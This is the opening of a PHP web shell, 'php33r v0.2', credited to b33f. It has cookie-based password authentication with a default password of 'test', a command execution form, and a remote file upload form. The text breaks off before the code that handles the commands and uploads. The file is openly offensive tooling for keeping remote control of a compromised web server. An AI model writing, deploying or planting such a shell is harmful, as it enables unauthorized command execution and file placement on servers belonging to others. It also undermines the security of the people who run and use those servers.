<!--------------------------------------------------------------------
//  Title: php33r v0.2 ~ "Secure" PHP web shell                     //
//  Author: b33f ~ Ruben Boonen (http://www.fuzzysecurity.com/)     //
//  Notes: Cookie time-out 15 minutes, trailing slashes are         //
//         are important for file upload, change default password!  //
//------------------------------------------------------------------//
//  I think where I am not, therefore I am where I do not think. I  //
//  am not whenever I am the plaything of my thought; I think of    //
//  what I am where I do not think to think. - Lacan                //
--------------------------------------------------------------------->

<?php
echo '<body style="background-color:#424242;">';

$password = 'test'; // Password
$padding = 'h2*%H8wsFp&G\U76,#OOg&Z,A'; // Random Padding

if (isset($_COOKIE['ph33rCookie'])) {
   if ($_COOKIE['ph33rCookie'] == md5($password.$padding)) {
?>

<!-- Authenticated -->
<font style="float:right;" color="#F2F2F2"><b>php33r v0.2</b> - b33f</font><br /><br />

<fieldset style="border:2px solid #ffffff;opacity:0.5;border-radius:5px;background:#FE2E2E;">
<form style="float:left;color:#ffffff;" action='<?php echo $_SERVER["PHP_SELF"]?>' method="post">
<b>Command Execution:</b><br />
<input type= "text" name="command" />
<input type="submit" value="Go!"/>
</form>

<form style="float:right;color:#ffffff;"action="" method="POST" enctype="multipart/form-data">
<b>Full Remote Path:</b><br />
<input type="text" name="upload" /> (eg: /tmp/, C:\Users\b33f\Desktop\)<br /><br />
